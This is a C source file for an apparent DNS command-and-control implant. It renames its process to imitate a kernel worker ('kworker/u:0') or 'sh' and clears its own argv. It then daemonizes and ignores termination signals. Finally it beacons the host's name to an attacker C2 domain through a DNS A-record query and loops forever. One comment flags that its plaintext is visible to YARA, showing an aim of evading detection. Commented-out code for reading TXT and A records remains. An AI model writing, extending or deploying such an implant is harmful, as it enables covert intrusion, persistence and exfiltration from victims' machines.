#include <stdio.h>
#include "dns.h"
#include <signal.h>
#include <unistd.h>
#include <sys/prctl.h>

// macros (in .env):
// C2_DOMAIN
// DNS_SERVER_1_ADDR 
// DNS_SERVER_2_ADDR
// UUID

int main(int argc, char **argv) {
    /// IMPORTANT: This part is easy to detect in stuff like YARA as it's in plaintext.
    if (getuid() == 0) {
        prctl(PR_SET_NAME, (unsigned long)"kworker/u:0", 0, 0, 0);
        strncpy(argv[0], "\0", strlen(argv[0]));
    } else {
        prctl(PR_SET_NAME, (unsigned long)"sh", 0, 0, 0);
        strncpy(argv[0], "sh", strlen(argv[0]));
    }
    daemon(0, 0);
    prctl(PR_SET_PDEATHSIG, SIGTERM);
    signal(SIGINT, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);

    char hostname[1024];
    hostname[1023] = '\0';
    gethostname(hostname, 1023);

    char data_query[1024 + 33 + 257];
    sprintf(data_query, "%s%s.%s", UUID, hostname, C2_DOMAIN);
    // printf("data_query: %s\n", data_query);

    (void)query_a(data_query);

    // txt_results = query_txt(hostname);

    // if(txt_results) {
    //     printf("TXT records for %s:\n\n", hostname);

    //     for(i = 0; txt_results[i] != NULL; i++) {
    //         printf("TXT %d\n", i);
    //         printf("Data: %s\n", txt_results[i]);

    //         //Free each string
    //         free(txt_results[i]);
    //     }

    //     //Free the array itself
    //     free(txt_results);
    // } else {
    //     printf("Failed to query TXT record for %s\n", hostname);
    // }

    // a_results = query_a(hostname);

    // if(a_results) {
    //     printf("A records for %s:\n", hostname);
    //     printf("%d.%d.%d.%d\n", a_results[0], a_results[1], a_results[2], a_results[3]);

    //     //Free the array itself
    //     free(a_results);
    // } else {
    //     printf("Failed to query A record for %s\n", hostname);
    // }

    while(1) {
        sleep(1);
    };

    return 0;
} 